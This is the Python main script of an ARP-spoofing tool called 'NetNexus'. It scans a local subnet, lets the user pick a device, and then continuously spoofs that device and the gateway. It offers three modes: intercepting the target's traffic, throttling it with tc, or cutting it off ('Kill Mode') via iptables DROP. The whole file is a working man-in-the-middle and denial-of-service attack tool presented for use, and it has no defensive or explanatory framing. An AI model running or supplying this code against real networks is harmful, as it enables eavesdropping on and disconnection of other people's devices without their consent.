import scapy.all as scapy
import os
import time
import sys
import subprocess
from core import scanner, spoof

def set_forwarding(state):
    """
    state=True: Intercept Mode (Forwarding ON)
    state=False: Kill Mode (Forwarding OFF + IPTables DROP)
    """
    if state:
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
        # Flush rules to allow traffic again
        subprocess.run(["sudo", "iptables", "-F"], capture_output=True)
        subprocess.run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], capture_output=True)
    else:
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True)
        # Force the kernel to drop all packets being routed through you
        subprocess.run(["sudo", "iptables", "-P", "FORWARD", "DROP"], capture_output=True)

def set_limit(interface, speed):
    subprocess.run(["sudo", "tc", "qdisc", "del", "dev", interface, "root"], capture_output=True)
    try:
        subprocess.run(["sudo", "tc", "qdisc", "add", "dev", interface, "root", "tbf", 
                        "rate", speed, "latency", "50ms", "burst", "1540"], check=True)
        print(f"[*] Bandwidth limited to {speed}")
    except Exception as e:
        print(f"[-] Limit Error: {e}")

def clear_limit(interface):
    subprocess.run(["sudo", "tc", "qdisc", "del", "dev", interface, "root"], capture_output=True)

def main():
    iface = "wlan0" # Verify with 'ip a'
    scapy.conf.iface = iface
    
    if os.geteuid() != 0:
        print("[-] NetNexus requires root. Use: sudo python main.py")
        return

    gateway_ip = "192.168.8.1"
    ip_range = "192.168.8.1/24"
    device_memory = {} 

    while True:
        print("\n" + "="*45)
        print("      NetNexus: Ultimate Control Build")
        print("="*45)
        
        device_memory = scanner.scan(ip_range, device_memory)
        current_list = list(device_memory.values())
        
        for index, dev in enumerate(current_list):
            print(f"{index}\t{dev['ip']}\t\t{dev['name']}")
        
        print("-" * 45)
        print("[R] Refresh  [C] Exit")
        
        user_input = input("\nSelect ID: ").lower().strip()
        if user_input == 'c': sys.exit()
        if user_input == 'r': continue
        
        try:
            target = current_list[int(user_input)]
            target_ip, target_mac = target['ip'], target['mac']

            print(f"\n[1] Intercept | [2] Limit | [3] Kill")
            mode = input("Select Action: ")

            print("[*] Resolving Gateway...")
            gateway_mac, _ = spoof.get_device_info(gateway_ip)

            # Execution Logic
            wait_time = 0.5
            if mode == "1":
                set_forwarding(True)
                clear_limit(iface)
            elif mode == "2":
                kbps = input("Speed (kbps): ")
                set_forwarding(True)
                set_limit(iface, f"{kbps}kbps")
            elif mode == "3":
                set_forwarding(False)
                clear_limit(iface)
                wait_time = 0.1 # Spam faster in Kill Mode

            print(f"[*] Attack Active on {target_ip} ({target_mac})...")
            while True:
                spoof.spoof(target_ip, gateway_ip, target_mac, gateway_mac)
                time.sleep(wait_time) 
                
        except (ValueError, IndexError):
            print("[-] Invalid Selection.")
        except KeyboardInterrupt:
            print("\n[*] Cleaning up system...")
            set_forwarding(True)
            clear_limit(iface)
            spoof.restore(target_ip, gateway_ip)
            spoof.restore(gateway_ip, target_ip)
            time.sleep(1)

if __name__ == "__main__":
    main()
